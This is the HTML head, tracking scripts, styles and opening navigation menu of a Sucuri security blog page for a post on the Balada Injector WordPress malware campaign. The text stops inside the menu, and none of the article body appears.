<!DOCTYPE html>
<html lang="en-US">
<head >
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />

<!-- Open Graph Meta Tags generated by MashShare 3.8.8 - https://mashshare.net -->
<meta property="og:type" content="article" /> 
<meta property="og:title" content="Balada Injector: Synopsis of a Massive Ongoing WordPress Malware Campaign" />
<meta property="og:description" content="A synopsis of the massive ongoing WordPress malware campaign: Balada Injector, including common techniques, functionalities, and vulnerability exploits used in attacks." />
<meta property="og:image" content="https://blog.sucuri.net/wp-content/uploads/2023/04/23-BlogPost_Feature-Image_1490x700_Balada-Injector.jpg" />
<meta property="og:url" content="https://blog.sucuri.net/2023/04/balada-injector-synopsis-of-a-massive-ongoing-wordpress-malware-campaign.html" />
<meta property="og:site_name" content="Sucuri Blog" />
<meta property="article:publisher" content="https://www.facebook.com/SucuriSecurity/" />
<meta property="article:published_time" content="2023-04-06T12:25:11-07:00" />
<meta property="article:modified_time" content="2023-04-06T12:25:48-07:00" />
<meta property="og:updated_time" content="2023-04-06T12:25:48-07:00" />
<!-- Open Graph Meta Tags generated by MashShare 3.8.8 - https://www.mashshare.net -->
<!-- Twitter Card generated by MashShare 3.8.8 - https://www.mashshare.net -->
<meta property="og:image:width" content="1491" />
<meta property="og:image:height" content="701" />
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Balada Injector: Synopsis of a Massive Ongoing WordPress Malware Campaign">
<meta name="twitter:description" content="Our team at Sucuri has been tracking a massive WordPress infection campaign since 2017 — but up until recently never bothered to give it a proper name. Typically, we refer to it as an ongoing">
<meta name="twitter:image" content="https://blog.sucuri.net/wp-content/uploads/2023/04/23-BlogPost_Feature-Image_1490x700_Balada-Injector.jpg">
<meta name="twitter:site" content="@sucurisecurity">
<!-- Twitter Card generated by MashShare 3.8.8 - https://www.mashshare.net -->


	<!-- This site is optimized with the Yoast SEO Premium plugin v20.5 (Yoast SEO v20.5) - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Balada Injector: Synopsis of a Massive Ongoing WordPress Malware Campaign</title>
	<meta name="description" content="A synopsis of the massive ongoing WordPress malware campaign: Balada Injector, including common techniques, functionalities, and vulnerability exploits used in attacks." />
	<link rel="canonical" href="https://blog.sucuri.net/2023/04/balada-injector-synopsis-of-a-massive-ongoing-wordpress-malware-campaign.html" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Balada Injector: Synopsis of a Massive Ongoing WordPress Malware Campaign" />
	<meta property="og:description" content="A synopsis of the massive ongoing WordPress malware campaign: Balada Injector, including common techniques, functionalities, and vulnerability exploits used in attacks." />
	<meta property="og:url" content="https://blog.sucuri.net/2023/04/balada-injector-synopsis-of-a-massive-ongoing-wordpress-malware-campaign.html" />
	<meta property="og:site_name" content="Sucuri Blog" />
	<meta property="article:publisher" content="https://www.facebook.com/sucurisecurity" />
	<meta property="article:published_time" content="2023-04-06T19:25:11+00:00" />
	<meta property="article:modified_time" content="2023-04-06T19:25:48+00:00" />
	<meta property="og:image" content="https://blog.sucuri.net/wp-content/uploads/2023/04/23-BlogPost_Feature-Image_1490x700_Balada-Injector.jpg" />
	<meta property="og:image:width" content="1491" />
	<meta property="og:image:height" content="701" />
	<meta property="og:image:type" content="image/jpeg" />
	<meta name="author" content="Denis Sinegubko" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:creator" content="@sucurisecurity" />
	<meta name="twitter:site" content="@sucurisecurity" />
	<meta name="twitter:label1" content="Written by" />
	<meta name="twitter:data1" content="Denis Sinegubko" />
	<meta name="twitter:label2" content="Est. reading time" />
	<meta name="twitter:data2" content="21 minutes" />
	<!-- / Yoast SEO Premium plugin. -->


<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Feed" href="https://blog.sucuri.net/feed" />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Comments Feed" href="https://blog.sucuri.net/comments/feed" />
<!-- This site uses the Google Analytics by MonsterInsights plugin v7.10.0 - Using Analytics tracking - https://www.monsterinsights.com/ -->
<script type="text/javascript" data-cfasync="false">
	var mi_version         = '7.10.0';
	var mi_track_user      = true;
	var mi_no_track_reason = '';
	
	var disableStr = 'ga-disable-UA-4077922-18';

	/* Function to detect opted out users */
	function __gaTrackerIsOptedOut() {
		return document.cookie.indexOf(disableStr + '=true') > -1;
	}

	/* Disable tracking if the opt-out cookie exists. */
	if ( __gaTrackerIsOptedOut() ) {
		window[disableStr] = true;
	}

	/* Opt-out function */
	function __gaTrackerOptout() {
	  document.cookie = disableStr + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
	  window[disableStr] = true;
	}
	
	if ( mi_track_user ) {
		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');

		__gaTracker('create', 'UA-4077922-18', 'auto');
		__gaTracker('set', 'forceSSL', true);
		__gaTracker('require', 'displayfeatures');
		__gaTracker('send','pageview');
	} else {
		console.log( "" );
		(function() {
			/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
			var noopfn = function() {
				return null;
			};
			var noopnullfn = function() {
				return null;
			};
			var Tracker = function() {
				return null;
			};
			var p = Tracker.prototype;
			p.get = noopfn;
			p.set = noopfn;
			p.send = noopfn;
			var __gaTracker = function() {
				var len = arguments.length;
				if ( len === 0 ) {
					return;
				}
				var f = arguments[len-1];
				if ( typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function' ) {
					console.log( 'Not running function __gaTracker(' + arguments[0] + " ....) because you are not being tracked. " + mi_no_track_reason );
					return;
				}
				try {
					f.hitCallback();
				} catch (ex) {

				}
			};
			__gaTracker.create = function() {
				return new Tracker();
			};
			__gaTracker.getByName = noopnullfn;
			__gaTracker.getAll = function() {
				return [];
			};
			__gaTracker.remove = noopfn;
			window['__gaTracker'] = __gaTracker;
					})();
		}
</script>
<!-- / Google Analytics by MonsterInsights -->
<link rel='stylesheet' id='sucuri-blog-css' href='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/style.css?ver=1.2.0' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css' href='https://blog.sucuri.net/wp-includes/css/dist/block-library/style.min.css?ver=6.1.1' type='text/css' media='all' />
<link rel='stylesheet' id='classic-theme-styles-css' href='https://blog.sucuri.net/wp-includes/css/classic-themes.min.css?ver=1' type='text/css' media='all' />
<style id='global-styles-inline-css' type='text/css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;}:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='select2-css' href='https://blog.sucuri.net/wp-content/plugins/facetwp-select2/select2/select2.min.css?ver=4.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='mashsb-styles-css' href='https://blog.sucuri.net/wp-content/plugins/mashsharer/assets/css/mashsb.min.css?ver=3.8.8' type='text/css' media='all' />
<style id='mashsb-styles-inline-css' type='text/css'>
.mashsb-count {color:#cccccc;}[class^="mashicon-"] .text, [class*=" mashicon-"] .text{
    text-indent: -9999px !important;
    line-height: 0px;
    display: block;
    } 
    [class^="mashicon-"] .text:after, [class*=" mashicon-"] .text:after {
        content: "" !important;
        text-indent: 0;
        font-size:13px;
        display: block !important;
    }
    [class^="mashicon-"], [class*=" mashicon-"] {
        width:25%;
        text-align: center !important;
    }
    [class^="mashicon-"] .icon:before, [class*=" mashicon-"] .icon:before {
        float:none;
        margin-right: 0;
    }
    .mashsb-buttons a{
       margin-right: 3px;
       margin-bottom:3px;
       min-width: 0;
       width: 41px;
    }
    .onoffswitch, 
    .onoffswitch-inner:before, 
    .onoffswitch-inner:after 
    .onoffswitch2,
    .onoffswitch2-inner:before, 
    .onoffswitch2-inner:after  {
        margin-right: 0px;
        width: 41px;
        line-height: 41px;
    }#mashbar-header .mashsb-count { 
    display:none; 
}
</style>
<link rel='stylesheet' id='sucuriblog-google-fonts-css' href='//fonts.googleapis.com/css?family=Open+Sans:300,400,400italic,700,600' type='text/css' media='all' />
<link rel='stylesheet' id='cookie-banner-css-css' href='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/css/cookie-banner.css?ver=20200427' type='text/css' media='all' />
<script type='text/javascript' id='monsterinsights-frontend-script-js-extra'>
/* <![CDATA[ */
var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[]","home_url":"https:\/\/blog.sucuri.net","hash_tracking":"false"};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/google-analytics-premium/assets/js/frontend.min.js?ver=7.10.0' id='monsterinsights-frontend-script-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/jquery/jquery.min.js?ver=3.6.1' id='jquery-core-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/facetwp-select2/select2/select2.min.js?ver=4.0.1' id='select2-js'></script>
<script type='text/javascript' id='mashsb-js-extra'>
/* <![CDATA[ */
var mashsb = {"shares":"89","round_shares":"1","animate_shares":"1","dynamic_buttons":"0","share_url":"https:\/\/blog.sucuri.net\/2023\/04\/balada-injector-synopsis-of-a-massive-ongoing-wordpress-malware-campaign.html","title":"Balada+Injector%3A+Synopsis+of+a+Massive+Ongoing+WordPress+Malware+Campaign","image":"https:\/\/blog.sucuri.net\/wp-content\/uploads\/2023\/04\/23-BlogPost_Feature-Image_1490x700_Balada-Injector.jpg","desc":"Our team at Sucuri has been tracking a massive WordPress infection campaign since 2017 \u2014 but up until recently never bothered to give it a proper name. Typically, we refer to it as an ongoing \u2026","hashtag":"@sucurisecurity","subscribe":"link","subscribe_url":"http:\/\/sucuri.hs-sites.com\/subscribe-to-security","activestatus":"1","singular":"1","twitter_popup":"1","refresh":"0","nonce":"c1f7c98175","postid":"31057","servertime":"1682186847","ajaxurl":"https:\/\/blog.sucuri.net\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/mashsharer/assets/js/mashsb.min.js?ver=3.8.8' id='mashsb-js'></script>
<!--[if lt IE 9]>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/html5shiv.min.js?ver=3.7.3' id='html5shiv-js'></script>
<![endif]-->
<link rel="https://api.w.org/" href="https://blog.sucuri.net/wp-json/" /><link rel="alternate" type="application/json" href="https://blog.sucuri.net/wp-json/wp/v2/posts/31057" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.sucuri.net/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blog.sucuri.net/wp-includes/wlwmanifest.xml" />
<link rel='shortlink' href='https://blog.sucuri.net/?p=31057' />


<!-- This site is optimized with the Schema plugin v1.7.9.5 - https://schema.press -->
<script type="application/ld+json">{"@context":"https:\/\/schema.org\/","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.sucuri.net\/2023\/04\/balada-injector-synopsis-of-a-massive-ongoing-wordpress-malware-campaign.html"},"url":"https:\/\/blog.sucuri.net\/2023\/04\/balada-injector-synopsis-of-a-massive-ongoing-wordpress-malware-campaign.html","headline":"Balada Injector: Synopsis of a Massive Ongoing WordPress Malware Campaign","datePublished":"2023-04-06T12:25:11-07:00","dateModified":"2023-04-06T12:25:48-07:00","publisher":{"@type":"Organization","@id":"https:\/\/blog.sucuri.net\/#organization","name":"Sucuri Blog","logo":{"@type":"ImageObject","url":"","width":600,"height":60}},"image":{"@type":"ImageObject","url":"https:\/\/blog.sucuri.net\/wp-content\/uploads\/2023\/04\/23-BlogPost_Feature-Image_1490x700_Balada-Injector.jpg","width":1491,"height":701},"articleSection":"Website Malware Infections","keywords":"Balada Injector, Black Hat Tactics, Hacked Websites, Malware, Obfuscation, Redirects, WordPress Plugins and Themes","description":"Our team at Sucuri has been tracking a massive WordPress infection campaign since 2017 — but up until recently never bothered to give it a proper name. Typically, we refer to it as an ongoing long lasting massive WordPress infection campaign that leverages all known and recently discovered theme","author":{"@type":"Person","name":"Denis Sinegubko","url":"https:\/\/blog.sucuri.net\/author\/denis","description":"Denis Sinegubko is Sucuri’s Senior Malware Researcher who joined the company in 2013. Denis' main responsibilities include researching emerging threats and creating  signatures for SiteCheck. The founder of UnmaskParasites, his professional experience covers over 20 years of programming and information security. When Denis isn’t analyzing malware, you might not find him online at all. Connect with him on Twitter.","image":{"@type":"ImageObject","url":"https:\/\/secure.gravatar.com\/avatar\/c9ef50b85bd345ea4e0d8da558816f3d?s=96&d=mm&r=g","height":96,"width":96}}}</script>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-4077922-18', 'auto');
  ga('require', 'linker');
  ga('linker:autoLink', ['ddecode.com', 'unmaskparasites.com', 'urlfind.org']);
  ga('send', 'pageview');
</script>

<script type="text/javascript">
(function(a,b,c,d,e,f,g){e['ire_o']=c;e[c]=e[c]||function(){(e[c].a=e[c].a||[]).push(arguments)};f=d.createElement(b);g=d.getElementsByTagName(b)[0];f.async=1;f.src=a;g.parentNode.insertBefore(f,g);})('//d.impactradius-event.com/A166802-5dda-4f98-aad8-1f58dbc8f1771.js','script','ire',document,window);
</script>
<script type='text/javascript'>/*<![CDATA[*/(function(n,d,c){d.setTime(d.getTime()+2592000000);c=(new RegExp('[?&]'+n+'=([^&#]*)','i')).exec(window.location.search);if(c=c?c[1]:null)document.cookie=n+'='+c+';expires='+d.toUTCString()+';domain=.sucuri.net;path=/';})('cjevent',new Date());/*]]>*/</script><!-- Tealium Universal Tag --><script type="text/javascript">(function(a,b,c,d){a='//tags.tiqcdn.com/utag/gpl/sucuri/prod/utag.js';b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a)})();</script>   
<style>
/*header logo fix*/
.faceted-search { margin-top: 66px!important; }
.title-area, .site-title, .site-title a { height: 42px; width: 171px; color: transparent!important; }
.site-title a { padding: 24px 8px!important; }
#menu-item-17506 { padding-bottom: 10px!important; }
</style>

<link rel="icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-32x32.png" sizes="32x32" />
<link rel="icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-180x180.png" />
<meta name="msapplication-TileImage" content="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-270x270.png" />
		<style type="text/css" id="wp-custom-css">
			#menu-item-17506{ background-color: #619f42;}
#menu-item-17506:hover {background-color:#478237}
#menu-item-17506 > a { color:#fff;}
.nav-primary {
 width: 80%;
}

.genesis-nav-menu {
 display:table;
}

.genesis-nav-menu .menu-item {
 float:none;
 display:table-cell;
 text-align:center;
 vertical-align:top;
}

.text-right {
 text-align:right !important;
}

.genesis-nav-menu .languages-sub-menu a {
 margin-right:0;
}

/* Blog Background Green Color Replace*/
#menu-item-17506 { background-color: #008673!important; }
.home.archive-post-grid .archive-featured-post:first-of-type { border-top: 8px solid #008673!important; }
.button { background-color: #008673!important; }
#sidebar-cta .widget { background-color: #008673!important; }
.fwp-load-more:focus, .fwp-load-more:hover, .load-more:focus, .load-more:hover {
    background-color: #008673!important;
}
.social-icons a::before {
    background-color: #008673!important;
}
.footer-widgets .social-icons a:focus::before, .footer-widgets .social-icons a:hover::before, .footer-widgets .button:focus, .footer-widgets .button:hover {
    background-color: #008673!important;
}	
.button { background-color: #008673!important; }

.footer-widgets .button:hover { background-color: #26BA9E!important; }
.site-header {
	background-color: #1c282e!important;}
.genesis-nav-menu a{color:#fff!important;}
.site-footer {
    background-color: #1c282e;}
.genesis-nav-menu .menu-item-login a {
    background-color: #00000000!important;}
.cookie-policy-banner .btn.btn-primary { background: #008673; }
.highlight { color: #1c282e; }
.fwp-load-more, .load-more { background-color: #1c282e!important; }
.site-footer-copyright { color:  #E9E7E7
; }
.genesis-nav-menu .sub-menu a { color: #676767!important; }
.page .entry, .single .entry { border-top: 8px solid #008673!important; }
/*.entry-content pre {
   background-image: linear-gradient(to top, #cdf5ed, #fff 70%);
    border-color: #028673; }
.entry-content ul li::before { color: #028673!important; }*/

.author-box { background-color: #1A272C!important; }
/*pre span {background: #ffffff00;}*/
/*FIX HEADER ANCHOR**/
h2:before{ 
content:"";
display:block;
height:90px;
margin:-90px 0 0;
}
h2{
	padding-top: unset !important;
}
		</style>
		</head>
<body class="post-template-default single single-post postid-31057 single-format-standard header-full-width content-sidebar"><div class="site-container"><ul class="genesis-skip-link"><li><a href="#genesis-nav-primary" class="screen-reader-shortcut"> Skip to primary navigation</a></li><li><a href="#genesis-content" class="screen-reader-shortcut"> Skip to content</a></li><li><a href="#genesis-sidebar-primary" class="screen-reader-shortcut"> Skip to primary sidebar</a></li><li><a href="#genesis-footer-widgets" class="screen-reader-shortcut"> Skip to footer</a></li></ul><header class="site-header" itemscope itemtype="https://schema.org/WPHeader"><div class="wrap"><div class="title-area"><p class="site-title" itemprop="headline"><a href="https://blog.sucuri.net/">Sucuri Blog</a></p><p class="site-description screen-reader-text" itemprop="description">Website Security News</p></div><nav class="nav-primary" aria-label="Main" itemscope itemtype="https://schema.org/SiteNavigationElement" id="genesis-nav-primary"><ul id="menu-header-navigation-ii" class="menu genesis-nav-menu menu-primary js-superfish"><li id="menu-item-17495" class="menu-item-products menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-17495"><a href="https://sucuri.net/website-antivirus/signup" itemprop="url"><span itemprop="name">Products</span></a>
<ul class="sub-menu">
	<li id="menu-item-17496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17496"><a href="https://sucuri.net/website-security-platform/signup/" itemprop="url"><span itemprop="name">Website Security Platform</span></a></li>
	<li id="menu-item-17497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17497"><a href="https://sucuri.net/website-firewall/" itemprop="url"><span itemprop="name">Website Firewall (WAF)</span></a></li>
	<li id="menu-item-20814" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20814"><a href="https://sucuri.net/custom/enterprise/" itemprop="url"><span itemprop="name">Enterprise Website Security</span></a></li>
	<li id="menu-item-20815" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20815"><a href="https://sucuri.net/custom/agency/" itemprop="url"><span itemprop="name">Multisite Solutions</span></a></li>
</ul>
</li>
<li id="menu-item-17498" class="menu-item-industry menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-17498"><a href="https://sucuri.net/website-security-platform/" itemprop="url"><span itemprop="name">Features</span></a>
<ul class="sub-menu">
	<li id="menu-item-17499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17499"><a href="https://sucuri.net/malware-detection-scanning/" itemprop="url"><span itemprop="name">Detection</span></a></li>
	<li id="menu-item-17500" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17500"><a href="https://sucuri.net/website-hack-protection/" itemprop="url"><span itemprop="name">Protection</span></a></li>
	<li id="menu-item-17501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17501"><a href="https://sucuri.net/website-performance/" itemprop="url"><span itemprop="name">Performance</span></a></li>
	<li id="menu-item-19564" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19564"><a href="https://sucuri.net/website-malware-removal/" itemprop="url"><span itemprop="name">Response</span></a></li>
	<li id="menu-item-19911" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19911"><a href="https://sucuri.net/website-backups/" itemprop="url"><span itemprop="name">Backups</span></a></li>
</ul>
</li>
<li id="menu-item-19912" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-19912"><a href="https://sucuri.net/partners/" itemprop="url"><span itemprop="name">Partners</span></a>
<ul class="sub-menu">
	<li id="menu-item-19913" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19913"><a href="https://sucuri.net/custom/agency/" itemprop="url"><span itemprop="name">Agency Solutions</span></a></li>
